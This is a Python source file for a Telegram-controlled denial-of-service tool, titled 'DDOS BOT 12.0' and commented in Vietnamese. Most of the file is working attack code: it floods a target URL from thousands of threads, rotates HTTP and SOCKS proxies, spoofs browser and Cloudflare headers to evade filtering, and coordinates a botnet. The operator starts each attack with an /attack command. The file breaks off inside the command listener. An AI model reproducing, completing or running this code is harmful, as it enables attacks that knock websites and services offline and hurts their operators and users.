# =====================================================
# DDOS BOT 12.0 - ULTIMATE COMPLETE EDITION
# TẤN CÔNG ĐA GIAO THỨC - PROXY TỰ ĐỘNG - MAX SPEED
# HỖ TRỢ HTTP/HTTPS/HTTP2/SOCKS4/SOCKS5 - BOTNET - CF BYPASS
# =====================================================

import requests
import threading
import random
import time
import os
import socket
import ssl
import json
import sys
import re
import hashlib
import base64
import shutil
import logging
import gc
import zlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote
import socks
from flask import Flask, jsonify

# -------------------- CẤU HÌNH --------------------
TELEGRAM_BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"  # THAY TOKEN

# TỐI ƯU TỐC ĐỘ TỐI ĐA
THREAD_COUNT = 5000
REQUESTS_PER_SECOND = 5000
MAX_RUN_TIME = 120
CONNECTION_POOL = 1500
TIMEOUT = 0.2
COOLDOWN_TIME = 1800
MAX_PROXY_BACKUP = 500000
PROXY_BATCH_SIZE = 20000

# LAYER7 TỐI ƯU
USE_HTTP2 = True
CF_BYPASS = True
RANDOM_PAYLOAD = True
KEEP_ALIVE = True

# BOTNET
BOTNET_PORT = 5555
BOTNET_MAX_BOTS = 5000
BOTNET_HEARTBEAT = 30

# RAM MANAGEMENT
MAX_RAM_PERCENT = 90
RAM_CHECK_INTERVAL = 3

# -------------------- BIẾN TOÀN CỤC --------------------
stop_event = threading.Event()
is_running = False
attack_thread = None
proxy_list = []
proxy_http = []
proxy_socks5 = []
proxy_socks4 = []
user_agents = []
proxy_update_time = 0
heartbeat_count = 0
bot_start_time = time.time()
chat_id_saved = None
is_cooldown = False
is_processing = False
processing_lock = threading.Lock()
ram_restart_flag = False

# Botnet
bots = {}
bots_lock = threading.Lock()
botnet_running = False

current_target = {
    'ip': '192.168.1.100',
    'port': 8080,
    'url': 'http://192.168.1.100:8080',
    'host': '192.168.1.100',
    'ssl': False
}

attack_stats = {
    'total_requests': 0,
    'success_count': 0,
    'fail_count': 0,
    'status_codes': {},
    'bytes_sent': 0,
    'start_time': 0,
    'max_speed': 0,
    'avg_speed': 0,
    'errors': 0,
    'botnet_bots': 0,
    'cf_bypassed': 0,
    'ram_usage': 0
}
stats_lock = threading.Lock()
dns_cache = {}
dns_cache_lock = threading.Lock()
session_pool = []
proxy_lock = threading.Lock()
ram_monitor_lock = threading.Lock()

# =====================================================
# LOAD USER-AGENT - MỞ RỘNG TỐI ĐA
# =====================================================
def load_user_agents():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 15; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
        "Mozilla/5.0 (Android 15; Mobile; rv:127.0) Gecko/127.0 Firefox/127.0",
    ]
    if os.path.exists("user_agents.txt"):
        with open("user_agents.txt", 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    agents.append(line)
    return agents

user_agents = load_user_agents()

# =====================================================
# RAM MANAGEMENT - CHỐNG TRÀN RAM
# =====================================================
def check_ram_usage():
    """Kiểm tra và tự động restart khi RAM vượt ngưỡng"""
    global ram_restart_flag
    with ram_monitor_lock:
        try:
            import psutil
            ram_percent = psutil.virtual_memory().percent
            with stats_lock:
                attack_stats['ram_usage'] = ram_percent
            
            if ram_percent > MAX_RAM_PERCENT and not ram_restart_flag:
                ram_restart_flag = True
                send_telegram(f"⚠️ RAM {ram_percent}% > {MAX_RAM_PERCENT}% - ĐANG RESTART...")
                gc.collect()
                with proxy_lock:
                    session_pool.clear()
                if is_running:
                    stop_event.set()
                    time.sleep(2)
                    stop_event.clear()
                ram_restart_flag = False
                return True
        except:
            pass
    return False

def ram_monitor_loop():
    """Vòng lặp giám sát RAM"""
    while True:
        time.sleep(RAM_CHECK_INTERVAL)
        check_ram_usage()

def memory_optimize():
    """Tối ưu bộ nhớ"""
    gc.collect()
    if len(dns_cache) > 1000:
        with dns_cache_lock:
            keys = list(dns_cache.keys())[:500]
            dns_cache.clear()
            for k in keys:
                if k in dns_cache:
                    dns_cache[k] = dns_cache[k]

# =====================================================
# PROXY MANAGEMENT - SIÊU TỐC
# =====================================================
def parse_proxy_line_ultra(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    try:
        if '://' in line:
            proto, rest = line.split('://', 1)
            proto = proto.lower()
            if proto not in ['socks5', 'socks4', 'http', 'https']:
                return None
            proxy_type = proto if proto != 'https' else 'http'
            if '@' in rest:
                auth, addr = rest.split('@', 1)
                if ':' in auth:
                    user, passwd = auth.split(':', 1)
                else:
                    user, passwd = '', ''
                ip, port = addr.rsplit(':', 1)
            else:
                ip, port = rest.rsplit(':', 1)
                user, passwd = '', ''
            return {
                'type': proxy_type,
                'ip': ip,
                'port': int(port),
                'user': user,
                'pass': passwd,
                'raw': line
            }
        elif '@' in line:
            auth, addr = line.split('@', 1)
            if ':' in auth and ':' in addr:
                user, passwd = auth.split(':', 1)
                ip, port = addr.rsplit(':', 1)
                return {
                    'type': 'http',
                    'ip': ip,
                    'port': int(port),
                    'user': user,
                    'pass': passwd,
                    'raw': f"http://{user}:{passwd}@{ip}:{port}"
                }
        elif ':' in line:
            ip, port = line.rsplit(':', 1)
            try:
                port_int = int(port)
                if 1 <= port_int <= 65535:
                    return {
                        'type': 'http',
                        'ip': ip,
                        'port': port_int,
                        'user': '',
                        'pass': '',
                        'raw': f"http://{ip}:{port}"
                    }
            except:
                pass
    except:
        pass
    return None

def process_proxy_batch_ultra(batch):
    http = []
    socks5 = []
    socks4 = []
    seen = set()
    for line in batch:
        proxy = parse_proxy_line_ultra(line)
        if proxy:
            key = f"{proxy['ip']}:{proxy['port']}:{proxy['type']}"
            if key in seen:
                continue
            seen.add(key)
            if proxy['type'] == 'http':
                http.append(proxy)
            elif proxy['type'] == 'socks5':
                socks5.append(proxy)
            elif proxy['type'] == 'socks4':
                socks4.append(proxy)
    return http, socks5, socks4

def load_proxies_ultra(filepath, callback=None):
    global is_processing
    with processing_lock:
        if is_processing:
            return
        is_processing = True

    def load_thread():
        try:
            if not os.path.exists(filepath):
                with processing_lock:
                    is_processing = False
                if callback:
                    callback(0, 0, 0)
                return
            http = []
            socks5 = []
            socks4 = []
            seen = set()
            batch = []
            count = 0
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        batch.append(line)
                        count += 1
                        if len(batch) >= PROXY_BATCH_SIZE:
                            h, s5, s4 = process_proxy_batch_ultra(batch)
                            http.extend(h)
                            socks5.extend(s5)
                            socks4.extend(s4)
                            batch = []
                            time.sleep(0.005)
                    if count >= MAX_PROXY_BACKUP:
                        break
                if batch:
                    h, s5, s4 = process_proxy_batch_ultra(batch)
                    http.extend(h)
                    socks5.extend(s5)
                    socks4.extend(s4)
            with proxy_lock:
                global proxy_http, proxy_socks5, proxy_socks4, proxy_list, proxy_update_time
                if len(http) + len(socks5) + len(socks4) > 0:
                    proxy_http = http
                    proxy_socks5 = socks5
                    proxy_socks4 = socks4
                    proxy_list = http + socks5 + socks4
                    proxy_update_time = time.time()
                    save_proxy_backup_ultra(proxy_list)
                    with open('proxies.txt', 'w', encoding='utf-8') as f:
                        f.write(f"# Proxy - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write(f"# Total: {len(proxy_list)}\n\n")
                        for p in proxy_list:
                            if p.get('raw'):
                                f.write(p['raw'] + '\n')
            if callback:
                callback(len(http), len(socks5), len(socks4))
        except Exception:
            if callback:
                callback(0, 0, 0)
        with processing_lock:
            is_processing = False

    threading.Thread(target=load_thread, daemon=True).start()

def save_proxy_backup_ultra(proxies):
    try:
        backup = {}
        backup_file = "proxy_backup.json"
        if os.path.exists(backup_file):
            with open(backup_file, 'r', encoding='utf-8') as f:
                backup = json.load(f)
        for p in proxies:
            key = f"{p['ip']}:{p['port']}:{p['type']}"
            if key not in backup:
                backup[key] = {
                    'raw': p.get('raw', ''),
                    'ip': p.get('ip', ''),
                    'port': p.get('port', 0),
                    'type': p.get('type', 'http'),
                    'user': p.get('user', ''),
                    'pass': p.get('pass', '')
                }
        if len(backup) > MAX_PROXY_BACKUP:
            items = list(backup.items())
            for key, _ in items[:len(items) - MAX_PROXY_BACKUP]:
                del backup[key]
        with open(backup_file, 'w', encoding='utf-8') as f:
            json.dump(backup, f, indent=2, ensure_ascii=False)
        return True
    except:
        return False

def load_proxy_backup_ultra():
    backup_file = "proxy_backup.json"
    if not os.path.exists(backup_file):
        return [], [], []
    try:
        with open(backup_file, 'r', encoding='utf-8') as f:
            backup = json.load(f)
        http, socks5, socks4 = [], [], []
        for key, entry in backup.items():
            p = {
                'type': entry.get('type', 'http'),
                'ip': entry.get('ip', ''),
                'port': entry.get('port', 0),
                'raw': entry.get('raw', ''),
                'user': entry.get('user', ''),
                'pass': entry.get('pass', '')
            }
            if p['type'] == 'http':
                http.append(p)
            elif p['type'] == 'socks5':
                socks5.append(p)
            elif p['type'] == 'socks4':
                socks4.append(p)
        return http, socks5, socks4
    except:
        return [], [], []

# =====================================================
# BOTNET SERVER
# =====================================================
def botnet_command_ultra(command, target=None):
    with bots_lock:
        for bot_id, bot_info in bots.items():
            try:
                if command == 'attack':
                    bot_info['target'] = target
                    bot_info['status'] = 'attacking'
                elif command == 'stop':
                    bot_info['status'] = 'idle'
                    bot_info['target'] = None
                elif command == 'ping':
                    bot_info['last_ping'] = time.time()
            except:
                pass

def botnet_attack_ultra(target, duration):
    with bots_lock:
        for bot_id, bot_info in bots.items():
            try:
                bot_info['target'] = target
                bot_info['duration'] = duration
                bot_info['status'] = 'attacking'
                bot_info['start_time'] = time.time()
            except:
                pass

def botnet_worker_ultra():
    while botnet_running:
        time.sleep(0.3)
        with bots_lock:
            for bot_id in list(bots.keys()):
                bot = bots[bot_id]
                if bot.get('status') == 'attacking':
                    target = bot.get('target')
                    if target:
                        try:
                            headers = generate_headers_lay7(target['host'])
                            if target['ssl']:
                                url = f"https://{target['host']}:{target['port']}"
                            else:
                                url = f"http://{target['host']}:{target['port']}"
                            for _ in range(10):
                                requests.get(url, headers=headers, timeout=0.2)
                            with stats_lock:
                                attack_stats['total_requests'] += 10
                                attack_stats['success_count'] += 10
                        except:
                            with stats_lock:
                                attack_stats['total_requests'] += 1
                                attack_stats['fail_count'] += 1

# =====================================================
# HTTP/2 SESSION POOL - TỐI ƯU
# =====================================================
class Http2SessionPool:
    def __init__(self, max_size=1500):
        self.pool = []
        self.max_size = max_size
        self.lock = threading.Lock()

    def get_session(self, proxy_dict=None):
        with self.lock:
            for i, session in enumerate(self.pool):
                try:
                    if hasattr(session, 'head'):
                        session.head('http://google.com', timeout=0.2)
                        return self.pool.pop(i)
                except:
                    continue
            return self._create_session(proxy_dict)

    def return_session(self, session):
        if session and len(self.pool) < self.max_size:
            with self.lock:
                self.pool.append(session)

    def _create_session(self, proxy_dict=None):
        session = requests.Session()
        session.timeout = TIMEOUT
        session.verify = False
        session.trust_env = False
        
        try:
            session.headers.update({'Connection': 'keep-alive, Upgrade'})
        except:
            pass
        
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=300,
            pool_maxsize=300,
            max_retries=0,
            pool_block=False
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        if proxy_dict and proxy_dict['type'] == 'http':
            session.proxies = {
                'http': proxy_dict['raw'],
                'https': proxy_dict['raw']
            }
        return session

session_pool = Http2SessionPool(CONNECTION_POOL)

# =====================================================
# GENERATE HEADERS - LAYER7 TỐI ƯU
# =====================================================
def generate_headers_lay7(hostname):
    fingerprint = hashlib.md5(str(random.randint(1, 9999999)).encode()).hexdigest()[:16]
    
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9,en;q=0.8', 'zh-CN,zh;q=0.9,en;q=0.8', 'ja-JP,ja;q=0.9,en;q=0.8']),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive, Upgrade' if KEEP_ALIVE else 'close',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Sec-Ch-Ua': f'"Chromium";v="{random.randint(120,128)}", "Google Chrome";v="{random.randint(120,128)}"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': random.choice(['"Windows"', '"macOS"', '"Linux"']),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'CF-IPCountry': random.choice(['US', 'VN', 'JP', 'DE', 'GB', 'FR', 'CA', 'AU', 'SG', 'KR', 'IN', 'BR', 'RU']),
        'Referer': random.choice([
            'https://www.google.com/',
            'https://www.facebook.com/',
            'https://www.youtube.com/',
            'https://twitter.com/',
            'https://www.instagram.com/',
            'https://www.tiktok.com/',
            'https://www.reddit.com/',
            'https://www.amazon.com/',
            'https://www.netflix.com/'
        ]),
        'X-Requested-With': 'XMLHttpRequest',
        'Cookie': f"_cf_bm={fingerprint}; __cfduid={hashlib.md5(str(time.time()).encode()).hexdigest()[:32]}",
        'DNT': '1',
        'Sec-GPC': '1'
    }
    
    if random.random() < 0.3:
        headers['Origin'] = f"https://{hostname}"
    if random.random() < 0.3:
        headers['X-Custom-Header'] = hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
    if random.random() < 0.2:
        headers['X-Cloud-Trace-Context'] = f"{random.randint(1,9999999)}/{random.randint(1,9999)};o={random.randint(0,1)}"
    if random.random() < 0.2:
        headers['X-Amzn-Trace-Id'] = f"Root=1-{hex(random.randint(1,9999999))[2:]}-{hex(random.randint(1,9999999))[2:]}"
    
    return headers

# =====================================================
# RESOLVE DNS - CACHE
# =====================================================
def resolve_host_ultra(host):
    with dns_cache_lock:
        if host in dns_cache:
            return dns_cache[host]
    try:
        ip = socket.gethostbyname(host)
        with dns_cache_lock:
            dns_cache[host] = ip
        return ip
    except:
        return host

# =====================================================
# ATTACK FUNCTIONS - LAYER7 TỐI ƯU
# =====================================================
def attack_http_lay7(proxy_dict, target):
    session = None
    try:
        session = session_pool.get_session(proxy_dict)
        headers = generate_headers_lay7(target['host'])
        url = target['url']
        
        if RANDOM_PAYLOAD:
            random_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3,15)))
            url = target['url'].rstrip('/') + random_path
            url += '?' + '&'.join([f"{random.randint(1,9999)}={random.randint(1,999999)}" for _ in range(random.randint(2,5))])
        
        method = random.choice(['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'PATCH', 'DELETE'])
        if method == 'GET':
            r = session.get(url, headers=headers, timeout=TIMEOUT)
        elif method == 'POST':
            data = {f'f{i}': 'x'*random.randint(50,200) for i in range(3)}
            r = session.post(url, data=data, headers=headers, timeout=TIMEOUT)
        elif method == 'HEAD':
            r = session.head(url, headers=headers, timeout=TIMEOUT)
        elif method == 'OPTIONS':
            r = session.options(url, headers=headers, timeout=TIMEOUT)
        elif method == 'PUT':
            r = session.put(url, data={'x': 'x'*random.randint(50,200)}, headers=headers, timeout=TIMEOUT)
        elif method == 'PATCH':
            r = session.patch(url, data={'x': 'x'*random.randint(50,200)}, headers=headers, timeout=TIMEOUT)
        else:
            r = session.delete(url, headers=headers, timeout=TIMEOUT)
        
        session_pool.return_session(session)
        
        if CF_BYPASS and (r.status_code == 503 or 'cf-challenge' in str(r.headers)):
            with stats_lock:
                attack_stats['cf_bypassed'] += 1
        
        with stats_lock:
            attack_stats['total_requests'] += 1
            code = str(r.status_code)
            attack_stats['status_codes'][code] = attack_stats['status_codes'].get(code, 0) + 1
            if 200 <= r.status_code < 400:
                attack_stats['success_count'] += 1
            else:
                attack_stats['fail_count'] += 1
            attack_stats['bytes_sent'] += 300
        return True
    except:
        with stats_lock:
            attack_stats['total_requests'] += 1
            attack_stats['fail_count'] += 1
            attack_stats['errors'] += 1
        if session:
            try:
                session.close()
            except:
                pass
        return False

def create_socks_socket_ultra(proxy_dict):
    try:
        sock = socks.socksocket()
        sock.settimeout(TIMEOUT)
        proxy_type = socks.SOCKS5 if proxy_dict['type'] == 'socks5' else socks.SOCKS4
        if proxy_dict.get('user') and proxy_dict.get('pass'):
            sock.set_proxy(proxy_type, proxy_dict['ip'], proxy_dict['port'],
                          username=proxy_dict['user'], password=proxy_dict['pass'])
        else:
            sock.set_proxy(proxy_type, proxy_dict['ip'], proxy_dict['port'])
        return sock
    except:
        return None

def attack_socket_lay7(proxy_dict, target):
    sock = None
    try:
        if proxy_dict and proxy_dict['type'] in ['socks5', 'socks4']:
            sock = create_socks_socket_ultra(proxy_dict)
            if not sock:
                return False
            sock.connect((resolve_host_ultra(target['host']), target['port']))
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            sock.connect((resolve_host_ultra(target['host']), target['port']))

        if target['ssl']:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=target['host'])

        random_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3,15)))
        path = random_path + f'?id={random.randint(1,999999)}&t={time.time()}'
        headers = generate_headers_lay7(target['host'])
        request = f"GET {path} HTTP/1.1\r\n"
        for key, value in headers.items():
            request += f"{key}: {value}\r\n"
        request += "\r\n"

        sock.send(request.encode())
        sock.close()

        with stats_lock:
            attack_stats['total_requests'] += 1
            attack_stats['success_count'] += 1
            attack_stats['bytes_sent'] += len(request)
        return True
    except:
        with stats_lock:
            attack_stats['total_requests'] += 1
            attack_stats['fail_count'] += 1
            attack_stats['errors'] += 1
        try:
            if sock:
                sock.close()
        except:
            pass
        return False

# =====================================================
# WORKER - LAYER7 TỐI ƯU
# =====================================================
def attack_worker_lay7(proxy_pools, target):
    http_proxies, socks5_proxies, socks4_proxies = proxy_pools
    local_count = 0
    while not stop_event.is_set():
        try:
            total_http = len(http_proxies)
            total_socks5 = len(socks5_proxies)
            total_socks4 = len(socks4_proxies)
            total = total_http + total_socks5 + total_socks4

            if total == 0:
                attack_socket_lay7(None, target)
            else:
                r = random.random()
                if r < 0.4 and total_http > 0:
                    proxy = random.choice(http_proxies)
                    attack_http_lay7(proxy, target)
                elif r < 0.7 and total_socks5 > 0:
                    proxy = random.choice(socks5_proxies)
                    attack_socket_lay7(proxy, target)
                elif r < 0.85 and total_socks4 > 0:
                    proxy = random.choice(socks4_proxies)
                    attack_socket_lay7(proxy, target)
                else:
                    attack_socket_lay7(None, target)

            local_count += 1
            if local_count > 100000:
                local_count = 0
                memory_optimize()

            time.sleep(1.0 / REQUESTS_PER_SECOND)
        except:
            continue

# =====================================================
# COOLDOWN
# =====================================================
def start_cooldown_ultra():
    global is_cooldown
    is_cooldown = True
    send_telegram(f"⏳ COOLDOWN: {COOLDOWN_TIME//60} phút")
    time.sleep(COOLDOWN_TIME)
    is_cooldown = False
    send_telegram("✅ COOLDOWN KẾT THÚC!")

# =====================================================
# TELEGRAM FUNCTIONS
# =====================================================
def send_telegram(message, chat_id=None, retry=2):
    global chat_id_saved
    if chat_id:
        chat_id_saved = chat_id
        try:
            with open('chat_id.txt', 'w') as f:
                f.write(str(chat_id))
        except:
            pass
    target_chat = chat_id or chat_id_saved
    if not target_chat:
        try:
            if os.path.exists('chat_id.txt'):
                with open('chat_id.txt', 'r') as f:
                    target_chat = f.read().strip()
        except:
            pass
    if not target_chat:
        return False
    for i in range(retry):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {
                'chat_id': target_chat,
                'text': message,
                'parse_mode': 'HTML',
                'disable_web_page_preview': True
            }
            requests.post(url, data=payload, timeout=5)
            return True
        except:
            time.sleep(0.5)
    return False

def download_telegram_file_ultra(file_id, save_path):
    for attempt in range(3):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile"
            r = requests.get(url, params={'file_id': file_id}, timeout=5)
            if r.status_code != 200:
                continue
            data = r.json()
            if not data.get('ok'):
                continue
            file_path = data['result']['file_path']
            download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
            r = requests.get(download_url, timeout=15)
            if r.status_code != 200:
                continue
            with open(save_path, 'wb') as f:
                f.write(r.content)
            return True
        except:
            time.sleep(0.5)
    return False

def handle_proxy_file_ultra(file_id, file_name, chat_id):
    if is_processing:
        send_telegram("⏳ Đang xử lý proxy khác, vui lòng đợi!", chat_id)
        return
    send_telegram(f"📥 Đang tải: {file_name}", chat_id)
    save_path = f"proxy_{int(time.time())}.txt"
    if download_telegram_file_ultra(file_id, save_path):
        def on_complete(http, socks5, socks4):
            total = http + socks5 + socks4
            if total > 0:
                send_telegram(f"""
✅ ĐÃ NHẬN {total} PROXY!
HTTP: {http} | SOCKS5: {socks5} | SOCKS4: {socks4}
🌐 Tổng: {len(proxy_list)}
                """, chat_id)
            else:
                send_telegram("❌ Không có proxy hợp lệ!", chat_id)
            try:
                os.remove(save_path)
            except:
                pass
        load_proxies_ultra(save_path, on_complete)
    else:
        send_telegram("❌ Không thể tải file!", chat_id)

# =====================================================
# PARSE TARGET
# =====================================================
def parse_target_ultra(target_string):
    target_string = target_string.strip()
    if target_string.startswith(('http://', 'https://')):
        parsed = urlparse(target_string)
        host = parsed.hostname or '127.0.0.1'
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        ssl = parsed.scheme == 'https'
        url = target_string
        if not parsed.path:
            url = url.rstrip('/') + '/'
        return {'ip': host, 'port': port, 'url': url, 'host': host, 'ssl': ssl}
    if ':' in target_string:
        parts = target_string.split(':')
        if len(parts) == 2:
            try:
                return {'ip': parts[0], 'port': int(parts[1]), 'url': f"http://{parts[0]}:{parts[1]}", 'host': parts[0], 'ssl': False}
            except:
                pass
    return {'ip': target_string, 'port': 80, 'url': f"http://{target_string}", 'host': target_string, 'ssl': False}

# =====================================================
# RUN ATTACK - 120s MỖI LỆNH
# =====================================================
def run_attack_ultra(target, chat_id):
    global is_running, current_target, is_cooldown
    if is_cooldown:
        send_telegram("⏳ ĐANG COOLDOWN!", chat_id)
        return
    
    # Kiểm tra RAM trước khi attack
    check_ram_usage()
    
    current_target = target
    with stats_lock:
        attack_stats.update({
            'total_requests': 0,
            'success_count': 0,
            'fail_count': 0,
            'status_codes': {},
            'bytes_sent': 0,
            'start_time': time.time(),
            'max_speed': 0,
            'errors': 0,
            'cf_bypassed': 0
        })
    stop_event.clear()
    is_running = True
    total_proxy = len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)
    bot_count = len(bots)
    send_telegram(f"""
▶️ <b>BẮT ĐẦU TẤN CÔNG LAYER7!</b>
🎯 {target['url']}
🌐 Proxy: {total_proxy}
🤖 Botnet: {bot_count}
⚡ Tốc độ: {REQUESTS_PER_SECOND} req/s
🧵 Luồng: {THREAD_COUNT}
⏱ 120 GIÂY
🛡 CF Bypass: {CF_BYPASS}
    """, chat_id)

    if bot_count > 0:
        botnet_attack_ultra(target, MAX_RUN_TIME)

    proxy_pools = (proxy_http, proxy_socks5, proxy_socks4)
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = [executor.submit(attack_worker_lay7, proxy_pools, target) for _ in range(THREAD_COUNT)]
        start = time.time()
        last_report = 0
        while time.time() - start < MAX_RUN_TIME and not stop_event.is_set():
            time.sleep(1)
            elapsed = int(time.time() - start)
            if elapsed > 0:
                with stats_lock:
                    rate = attack_stats['total_requests'] / elapsed
                    if rate > attack_stats['max_speed']:
                        attack_stats['max_speed'] = rate
            
            # Kiểm tra RAM định kỳ
            if elapsed % 10 == 0:
                check_ram_usage()
                memory_optimize()
            
            if elapsed - last_report >= 10:
                last_report = elapsed
                with stats_lock:
                    total = attack_stats['total_requests']
                    rate = total / max(elapsed, 1)
                    max_speed = attack_stats['max_speed']
                    cf_bypassed = attack_stats.get('cf_bypassed', 0)
                send_telegram(f"⚡ {elapsed}s/120s | {rate:.1f} req/s | Max: {max_speed:.1f} | {total:,} | CF: {cf_bypassed}", chat_id)

    stop_event.set()
    is_running = False
    botnet_command_ultra('stop')
    threading.Thread(target=start_cooldown_ultra, daemon=True).start()

    with stats_lock:
        total = attack_stats['total_requests']
        success = attack_stats['success_count']
        fail = attack_stats['fail_count']
        elapsed = int(time.time() - attack_stats['start_time'])
        rate = total / max(elapsed, 1)
        max_speed = attack_stats['max_speed']
        cf_bypassed = attack_stats.get('cf_bypassed', 0)
        ram = attack_stats.get('ram_usage', 0)
    send_telegram(f"""
⏹️ <b>ĐÃ DỪNG SAU {elapsed}s</b>
📊 Tổng: {total:,} | ✅ {success:,} | ❌ {fail:,}
📈 Tốc độ: {rate:.1f} req/s | ⚡ Max: {max_speed:.1f}
🛡 CF Bypass: {cf_bypassed}
🛡 RAM: {ram}%
🤖 Botnet: {bot_count} bots
    """, chat_id)

# =====================================================
# TELEGRAM LISTENER - TỐI ƯU
# =====================================================
def telegram_listener_ultra():
    global is_running, attack_thread, THREAD_COUNT, REQUESTS_PER_SECOND, botnet_running
    last_update_id = 0

    send_telegram("""
🚀 <b>DDOS BOT 12.0 - ULTIMATE COMPLETE</b>
✅ Đã khởi động!
⚡ Tốc độ: 5000+ req/s
🛡 Chống tràn RAM tự động
📌 HTTP/HTTPS/HTTP2 + BOTNET
⏱ Mỗi lệnh: 120 GIÂY

📋 LỆNH:
<code>/attack URL</code> - Tấn công 120s
<code>/stop</code> - Dừng
<code>/status</code> - Trạng thái
<code>/proxy</code> - Số proxy
<code>/botnet</code> - Botnet status
<code>/ram</code> - Xem RAM
<code>/threads N</code> - Đổi luồng
<code>/speed N</code> - Đổi tốc độ
<code>/cf</code> - Bật/tắt CF Bypass
<code>/help</code> - Trợ giúp
    """)

    botnet_running = True
    threading.Thread(target=botnet_worker_ultra, daemon=True).start()

    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            r = requests.get(url, params={'offset': last_update_id + 1, 'timeout': 10}, timeout=15)
            if r.status_code == 200:
                data = r.json()
                if data.get('ok'):
                    for update in data.get('result', []):
                        last_update_id = update['update_id']
                        msg = update.get('message', {})
                        chat_id = msg.get('chat', {}).get('id')
                        if not chat_id:
                            continue

                        document = msg.get('document')
                        if document and document.get('file_name', '').endswith('.txt'):
                            handle_proxy_file_ultra(document['file_id'], document['file_name'], chat_id)

                        text = msg.get('text', '').strip()
                        if not text:
                            continue
                        cmd = text.lower()

                        if cmd.startswith('/attack'):
                            parts = text.split(maxsplit=1)
                            if len(parts) >= 2:
                                target = parse_target_ultra(parts[1].strip())
                                if is_running:
                                    send_telegram("⚠️ Đang tấn công! Dùng /stop trước.", chat_id)
                                elif len(proxy_list) == 0:
                                    send_telegram("⚠️ Không có proxy! Gửi file .txt", chat_id)
                                else:
                                    attack_thread = threading.Thread(target=run_attack_ultra, args=(target, chat_id), daemon=True)
                                    attack_thread.start()
                            else:
                                send_telegram("❌ /attack [URL] hoặc [IP:PORT]", chat_id)

                        elif cmd == '/stop':
                            if is_running:
                                stop_event.set()
                                is_running = False
